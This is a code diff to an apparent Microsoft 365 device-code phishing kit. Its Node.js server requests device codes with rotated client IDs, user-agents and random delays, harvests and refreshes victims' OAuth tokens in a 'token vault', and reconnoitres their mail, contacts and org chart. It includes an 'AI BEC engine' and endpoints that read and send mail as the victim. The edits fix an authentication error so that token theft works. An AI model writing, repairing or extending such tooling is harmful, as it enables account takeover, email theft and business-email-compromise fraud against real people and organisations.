@@ -1,5 +1,5 @@
 // ================================================
-// 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁 — 𝙵𝙸𝙽𝙰𝙻 𝚆𝙸𝚃𝙷 𝙰𝙻𝙻 𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂
+// 𝙿𝚁𝙾𝚇𝚈 𝚂𝙴𝚁𝚅𝙴𝚁 — 𝙵𝙸𝙽𝙰𝙻 𝚆𝙸𝚃𝙷 𝙰𝙻𝙻 𝙴𝙽𝙳𝙿𝙾𝙸𝙽𝚃𝚂 & 𝙵𝙸𝚇𝙴𝚂
 // ================================================
 
 const http = require("http");
@@ -579,8 +579,9 @@ dashApp.post('/api/device/manual', async (req, res) => {
     try {
         const code = user_code || device_code;
         const DEVICE_CLIENT_ID = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
+        // ✅ FIX: Use 'organizations' tenant to avoid AADSTS50059
         const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
+            'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: DEVICE_CLIENT_ID,
                 scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
@@ -664,7 +665,18 @@ dashApp.get('/api/device/flow/:deviceCode', (req, res) => {
 });
 
 // ── ✅ TOKEN VAULT ENDPOINTS ──
-const TokenVault = require('./token_vault.js');
+let TokenVault;
+try {
+    TokenVault = require('./token_vault.js');
+} catch (e) {
+    TokenVault = class { 
+        constructor() {} 
+        scanLogs() { return []; } 
+        getTokensByUser() { return {}; } 
+        getStats() { return { total: 0, valid: 0, expired: 0, unknown: 0 }; } 
+        healthCheckAll() { return []; } 
+    };
+}
 const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);
 
 dashApp.post('/api/vault/scan', (req, res) => {
@@ -678,7 +690,7 @@ dashApp.post('/api/vault/scan', (req, res) => {
 
 dashApp.get('/api/vault/tokens', (req, res) => {
     try {
-        res.json({ success: true, tokens: vault.tokens });
+        res.json({ success: true, tokens: vault.tokens || [] });
     } catch (err) {
         res.status(500).json({ error: err.message });
     }
@@ -717,7 +729,7 @@ dashApp.post('/api/vault/exchange', async (req, res) => {
 
     try {
         const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
             new URLSearchParams({
                 client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                 refresh_token: tokenValue,
@@ -740,7 +752,12 @@ dashApp.post('/api/recon', async (req, res) => {
     if (!accessToken) return res.status(400).json({ error: 'Access token required' });
 
     try {
-        const GraphClient = require('./graph_api.js');
+        let GraphClient;
+        try {
+            GraphClient = require('./graph_api.js');
+        } catch (e) {
+            return res.status(500).json({ error: 'graph_api.js not found' });
+        }
         const graph = new GraphClient(accessToken);
         
         const [profile, inbox, sent, contacts, events, manager, directReports, org] = await Promise.all([
@@ -777,7 +794,12 @@ dashApp.post('/api/ai/analyze', async (req, res) => {
     if (!groqApiKey) return res.status(400).json({ error: 'Groq API key required' });
 
     try {
-        const AIBECEngine = require('./ai_bec_engine.js');
+        let AIBECEngine;
+        try {
+            AIBECEngine = require('./ai_bec_engine.js');
+        } catch (e) {
+            return res.status(500).json({ error: 'ai_bec_engine.js not found' });
+        }
         const engine = new AIBECEngine(groqApiKey);
         const result = await engine.runFullAnalysis(accessToken, refreshToken, email);
         res.json({ success: true, ...result });
@@ -792,7 +814,12 @@ dashApp.post('/api/webmail/folders', async (req, res) => {
     if (!accessToken) return res.status(400).json({ error: 'Access token required' });
 
     try {
-        const GraphClient = require('./graph_api.js');
+        let GraphClient;
+        try {
+            GraphClient = require('./graph_api.js');
+        } catch (e) {
+            return res.status(500).json({ error: 'graph_api.js not found' });
+        }
         const graph = new GraphClient(accessToken);
         const folders = await graph.getMailFolders();
         res.json({ success: true, folders: folders.value || [] });
@@ -806,7 +833,12 @@ dashApp.post('/api/webmail/emails', async (req, res) => {
     if (!accessToken) return res.status(400).json({ error: 'Access token required' });
 
     try {
-        const GraphClient = require('./graph_api.js');
+        let GraphClient;
+        try {
+            GraphClient = require('./graph_api.js');
+        } catch (e) {
+            return res.status(500).json({ error: 'graph_api.js not found' });
+        }
         const graph = new GraphClient(accessToken);
         
         let endpoint;
@@ -831,7 +863,12 @@ dashApp.post('/api/webmail/email', async (req, res) => {
     if (!messageId) return res.status(400).json({ error: 'Message ID required' });
 
     try {
-        const GraphClient = require('./graph_api.js');
+        let GraphClient;
+        try {
+            GraphClient = require('./graph_api.js');
+        } catch (e) {
+            return res.status(500).json({ error: 'graph_api.js not found' });
+        }
         const graph = new GraphClient(accessToken);
         const email = await graph.get(`/messages/${messageId}?$select=id,subject,sender,toRecipients,ccRecipients,bccRecipients,receivedDateTime,body,isRead,hasAttachments,importance,conversationId`);
         res.json({ success: true, email });
@@ -846,7 +883,12 @@ dashApp.post('/api/webmail/send', async (req, res) => {
     if (!to || !subject || !body) return res.status(400).json({ error: 'To, subject, and body required' });
 
     try {
-        const GraphClient = require('./graph_api.js');
+        let GraphClient;
+        try {
+            GraphClient = require('./graph_api.js');
+        } catch (e) {
+            return res.status(500).json({ error: 'graph_api.js not found' });
+        }
         const graph = new GraphClient(accessToken);
         
         const emailData = {
@@ -878,7 +920,12 @@ dashApp.post('/api/webmail/search', async (req, res) => {
     if (!query) return res.status(400).json({ error: 'Search query required' });
 
     try {
-        const GraphClient = require('./graph_api.js');
+        let GraphClient;
+        try {
+            GraphClient = require('./graph_api.js');
+        } catch (e) {
+            return res.status(500).json({ error: 'graph_api.js not found' });
+        }
         const graph = new GraphClient(accessToken);
         const searchUrl = folderId === 'inbox' 
             ? `/mailFolders/inbox/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`
@@ -1282,7 +1329,7 @@ const app = express();
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ── ✅ DEVICE CODE API ──
+// ── ✅ DEVICE CODE API (FIXED: using 'organizations' tenant) ──
 app.post('/device/request', async (req, res) => {
     if (!axios) {
         return res.status(500).json({ error: 'axios not installed. Run: npm install axios' });
@@ -1298,8 +1345,9 @@ app.post('/device/request', async (req, res) => {
         
         await randomDelay(300, 800);
         
+        // ✅ FIX: Use 'organizations' instead of 'common' to avoid AADSTS50059
         const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
+            'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: clientId,
                 scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
@@ -1315,7 +1363,6 @@ app.post('/device/request', async (req, res) => {
         const data = response.data;
         console.log('✅ Device code obtained:', data.user_code);
         
-        const tokenType = 'Pending';
         const newFlow = {
             device_code: data.device_code,
             user_code: data.user_code,
@@ -1333,7 +1380,7 @@ app.post('/device/request', async (req, res) => {
             client_id: clientId,
             user_agent: userAgent,
             session_id: crypto.randomBytes(16).toString('hex'),
-            token_type: tokenType
+            token_type: 'Pending'
         };
         deviceFlows.push(newFlow);
         saveDeviceFlows(deviceFlows);
@@ -1344,7 +1391,6 @@ app.post('/device/request', async (req, res) => {
 🔗 **Verification URI:** ${data.verification_uri}
 ⏱️ **Expires in:** ${data.expires_in} seconds
 📱 **Client:** ${clientId}
-🔄 **UA:** ${userAgent.slice(0, 40)}...
 **Code:** \`${data.user_code}\`
         `;
         try {
@@ -1362,7 +1408,7 @@ app.post('/device/request', async (req, res) => {
     }
 });
 
-// ── ✅ DEVICE TOKEN POLLING ──
+// ── ✅ DEVICE TOKEN POLLING (FIXED: using 'organizations' tenant) ──
 app.post('/device/token', async (req, res) => {
     if (!axios) {
         return res.status(500).json({ error: 'axios not installed. Run: npm install axios' });
@@ -1382,8 +1428,9 @@ app.post('/device/token', async (req, res) => {
         
         await randomDelay(200, 600);
         
+        // ✅ FIX: Use 'organizations' to match the device code request
         const response = await axios.post(
-            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
             new URLSearchParams({
                 client_id: clientId,
                 device_code: device_code,
@@ -1602,7 +1649,7 @@ const server = app.listen(PORT, '0.0.0.0', () => {
     console.log(`📱 Device Code: /device`);
     console.log(`🔄 Client Rotation: ${CLIENT_IDS.length} clients loaded`);
     console.log(`🔄 UA Rotation: ${USER_AGENTS.length} user-agents loaded`);
-    console.log(`📊 Client IDs: ${CLIENT_IDS.join(', ')}`);
+    console.log(`✅ Using 'organizations' tenant (fixed AADSTS50059)`);
 });
 
 // ── ✅ WEBSOCKET SUPPORT ──
